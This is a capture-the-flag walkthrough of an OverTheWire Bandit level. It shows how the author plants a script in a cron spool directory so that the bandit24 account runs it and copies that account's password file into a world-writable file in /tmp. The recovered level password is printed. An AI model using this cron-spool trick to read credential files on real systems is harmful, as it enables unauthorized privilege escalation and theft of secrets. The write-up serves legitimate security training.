- `cd`

```
bandit23@bandit:~$ cd /etc/cron.d
```

- `ls`

```
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root
```

- `cat`

```
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

The script shows that every file in the path of `/var/spool/$myname` will be executed once and deleted after 60 seconds.
So we need to create a script which fetches the password from `/etc/bandit_pass/bandit24` and store it in a temp file.

First we have to create a directory.

- `mkdir` 

```
bandit23@bandit:~$ mkdir /tmp/foo
bandit23@bandit:~$ cd /tmp/foo
bandit23@bandit:/tmp/foo$
```

Then we create the script file and set permission to **777** (full access).

- `touch, chmod`

```
bandit23@bandit:/tmp/foo$ touch script.sh
bandit23@bandit:/tmp/foo$ chmod 777 script.sh
bandit23@bandit:/tmp/foo$ ls -al script.sh
-rwxrwxrwx 1 bandit23 root 0 Feb  2 11:21 script.sh
```

Write the content of the script using a command-line text editor such as **vim**.

- `vim`

```
bandit23@bandit:/tmp/foo$ vim script.sh
```

The content of the script is:

```
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/foo/password
```

Again, we need to create the `/tmp/foo/password` file and grant everyone read/write permission.

```
bandit23@bandit:/tmp/foo$ touch password
bandit23@bandit:/tmp/foo$ chmod 666 password
bandit23@bandit:/tmp/foo$ ls -al password
-rw-rw-rw- 1 bandit23 root 0 Feb  2 11:22 password
```

Copy the script to `/var/spool/bandit24` and wait for the script to run automatically.

- `cp`

```
bandit23@bandit:/tmp/foo$ cp script.sh /var/spool/bandit24/

bandit23@bandit:/tmp/foo$ ls -al /var/spool/bandit24/script.sh
-rwxr-xr-x 1 bandit23 bandit23 63 Feb  2 11:23 /var/spool/bandit24/script.sh
```

[**WAIT FOR A MINUTE**...]

```
bandit23@bandit:/tmp/foo$ ls -al /var/spool/bandit24/script.sh
ls: cannot access '/var/spool/bandit24/script.sh': No such file or directory
```

The script file is no longer existed. That means it has been executed.

- `cat`

```
bandit23@bandit:/tmp/foo$ cat password
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

Password: `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`

```
ssh bandit24@bandit.labs.overthewire.org -p 2220
```
